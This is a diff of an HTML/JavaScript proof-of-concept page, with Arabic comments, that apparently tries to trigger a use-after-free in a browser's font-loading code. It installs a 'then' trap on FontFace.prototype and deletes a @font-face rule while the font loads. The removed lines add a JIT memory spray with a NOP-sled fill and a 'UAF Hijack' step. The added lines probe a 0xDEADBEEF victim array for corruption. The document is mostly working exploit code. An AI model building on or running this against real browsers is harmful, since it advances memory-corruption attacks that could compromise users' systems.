@@ -1,66 +1,30 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <style id="s">
-        @font-face { font-family: 'x'; src: url('nonexistent-font.woff'); unicode-range: U+0042; }
-    </style>
-</head>
 <body>
-    <div id="console" style="background:#000; color:#0f0; font-family:'Courier New', monospace; height:95vh; overflow-y:scroll; padding:15px; border:1px solid #333;"></div>
-
+    <div id="console" style="background:#000; color:#0f0; font-family:monospace; height:90vh; overflow:auto;"></div>
     <script>
         const logBox = document.getElementById('console');
-        function debug(msg) {
-            const time = performance.now().toFixed(2);
-            logBox.innerHTML += `<div>[${time}ms] ${msg}</div>`;
-            logBox.scrollTop = logBox.scrollHeight;
-        }
-
-        // دالة رش الذاكرة (JIT Spraying)
-        function jitSpray() {
-            debug("Applying JIT Memory Spray...");
-            let code = new Uint32Array(0x1000);
-            code.fill(0x90909090); // NOP Sled: الهدف هو خداع مؤشر التنفيذ
-            return code;
-        }
+        function debug(msg) { logBox.innerHTML += `<div>[${performance.now().toFixed(2)}ms] ${msg}</div>`; }
 
         window.onload = () => {
-            debug("System Initialized. Starting Aggressive PoC...");
-
             let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
-            void A.loaded;
+            
+            // مصفوفة لنرى هل سيتم الكتابة فوقها
+            let victim = new Uint32Array(0x10);
+            victim.fill(0xDEADBEEF);
 
-            let fired = false;
             Object.defineProperty(FontFace.prototype, 'then', {
                 configurable: true,
                 get() {
-                    if (!fired && this === A) {
-                        fired = true;
-                        debug("!!! TRAP HIT: Initiating JIT Hijack !!!");
-                        
-                        // 1. تفعيل الرش في لحظة الـ Trap
-                        jitSpray();
-                        
-                        // 2. إنشاء كائنات تضخيم
-                        new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
-                        new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
-                        
-                        // 3. حذف القاعدة وإحداث الانهيار
-                        document.getElementById('s').sheet.deleteRule(0);
-                        
-                        try {
-                            document.body.offsetTop;
-                        } catch(e) {}
-                        
-                        debug("CRITICAL: UAF Hijack attempt triggered.");
-                    }
+                    debug("!!! TRAP HIT: Scanning Memory...");
+                    // محاولة قراءة ذاكرة المصفوفة بعد إفسادها
+                    debug("Memory snapshot[0]: " + victim[0].toString(16));
                     return undefined;
                 }
             });
 
-            debug("Loading font 'x'...");
-            document.fonts.load('1em x', 'AB').catch(e => debug("Result: " + e.message));
+            document.fonts.load('1em x', 'AB');
         };
     </script>
 </body>
